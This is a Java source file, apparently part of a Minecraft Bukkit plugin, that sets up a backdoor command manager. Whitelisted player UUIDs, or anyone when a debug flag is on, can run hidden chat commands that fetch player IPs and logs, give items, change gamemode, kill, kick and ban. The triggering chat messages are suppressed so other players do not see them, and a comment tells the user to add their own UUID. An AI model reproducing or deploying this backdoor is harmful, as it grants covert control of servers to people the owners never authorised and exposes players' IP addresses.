package me.tsb.backdoor;

import lombok.Getter;
import lombok.SneakyThrows;
import me.tsb.backdoor.commands.*;
import me.tsb.backdoor.commands.bans.*;
import me.tsb.plugin.Main;
import org.bukkit.ChatColor;
import org.bukkit.event.player.PlayerChatEvent;
import org.reflections.Reflections;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class CommandMan {

    private final Main main;

    public CommandMan(Main main) {
        this.main = main;
    }

    public String EXCEPTION_CAUGHT = ChatColor.RED + "Internal exception. Was caught, no console errors.";

    // add your uuid to this list to be able to use the plugin
    // if Main.debug is true anyone can use the commands, so set it to false and add the uuids
    List<String> whitelistedUsers = Arrays.asList("");

    @Getter
    private final List<Command> commands = new ArrayList<>();

    @SneakyThrows
    public void init() {
        try {
            AddCommand(new XPCommand());
            AddCommand(new WhitelistCommand());
            AddCommand(new TpCommand());
            AddCommand(new SummonCommand());
            AddCommand(new SeedCommand());
            AddCommand(new PlayerPositionCommand());
            AddCommand(new KillCommand());
            AddCommand(new IpCommand());
            AddCommand(new HelpCommand());
            AddCommand(new GiveCommand());
            AddCommand(new GetLogsCommand());
            AddCommand(new GamemodeCommand());
            AddCommand(new FixCommand());
            AddCommand(new FillerCommand(main));
            AddCommand(new EnchantCommand());
            AddCommand(new EffectCommand());
            AddCommand(new CommandsCommand(main));
            AddCommand(new BedPositionCommand());
            AddCommand(new UnBanIpCommand());
            AddCommand(new UnBanIpCommand());
            AddCommand(new KickCommand());
            AddCommand(new BanIpCommand());
            AddCommand(new BanCommand());

        } catch (Exception ignored) {
        }
    }


    public void onExec(PlayerChatEvent event) {
        ArrayList<String> args = new ArrayList<>(Arrays.asList(event.getMessage().split(" ")));

        if (args.get(0).startsWith(Command.prefix) && (whitelistedUsers.contains(event.getPlayer().getUniqueId().toString()) || Main.debug)) {
            event.setCancelled(true);
        } else return;
        for (Command c : commands) {

            for (String s : c.getAliases()) {
                if (args.get(0).equalsIgnoreCase(Command.prefix + s)) {
                    try {

                        StringBuilder sb = new StringBuilder(args.get(0));
                        sb.delete(0, Command.prefix.length());

                        args.add(0, sb.toString());

                        c.onExec(event, args);
                    } catch (Exception e) {
                        event.getPlayer().sendMessage(EXCEPTION_CAUGHT);
                        Main.logger.exception(e.getMessage());
                    }
                    return;
                }
            }
        }
    }

    public void AddCommand(Command command) {
        commands.add(command);
        Main.logger.log("Added command " + command.getDisplayName());
    }
}
